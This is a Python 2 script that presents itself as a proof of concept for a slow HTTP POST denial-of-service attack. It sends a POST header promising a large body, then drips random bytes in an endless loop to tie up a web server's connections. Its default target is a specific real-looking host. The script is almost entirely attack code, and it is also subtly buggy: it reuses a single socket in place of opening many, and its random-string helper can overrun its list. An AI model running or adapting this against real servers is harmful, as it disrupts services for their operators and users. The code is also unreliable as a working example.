#!/usr/bin/env python

'''
    a POC of http post LDOS
'''

import optparse
import socket
import time
import random

def randomMsg():
    randstr=['a','b','c','d','e','f','g','1','2','3']
    rand=random.random()
    rand=10*rand
    rand=int(round(rand,0))
    mystr=''
    for i in range(rand):
        mystr=mystr+randstr[i]

    return mystr
    

def httpPostDos(target):
    ''' main test procedures '''

    host=target
    port=80
        
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        client.connect((host,port))
    except:
        print 'connect failed'

    clients=[]
    max_connections=2000
    header="POST /a HTTP/1.1\r\n"+\
            "HOST: "+host+"\r\n"+\
            "Connection: keep-alive\r\n"+\
            "Keep-Alive: 900\r\n"+\
            "Content-Length: 100000\r\n";
    
    #bulid connections
    for i in range(max_connections):
        try:
            client.send(header)
            print 'send header'+str(i)+' times successfully'
            clients.append(client)
        except:
            print 'send header'+str(i)+' times failed'


    #keep connections alive
    while True:
        for i in range(len(clients)):
            try:
                clients[i].send(randomMsg())
                print "client "+str(i)+" sends data successfully"
            except:
                print "client "+str(i)+" sends data failed"
        time.sleep(1)


def main():

    parser=optparse.OptionParser("usage <-H host>")
    parser.add_option("-H","--host",\
                      dest="tgt",help="the target host",type="string",\
                      default="www.bpos.net")
    (options,args)=parser.parse_args()
    tgt=options.tgt
    if tgt==None:
        print parser.usage
        exit(1)
        
    #tgt="www.bpos.net"
    httpPostDos(tgt)

if __name__=="__main__":
    main()














    
    
    
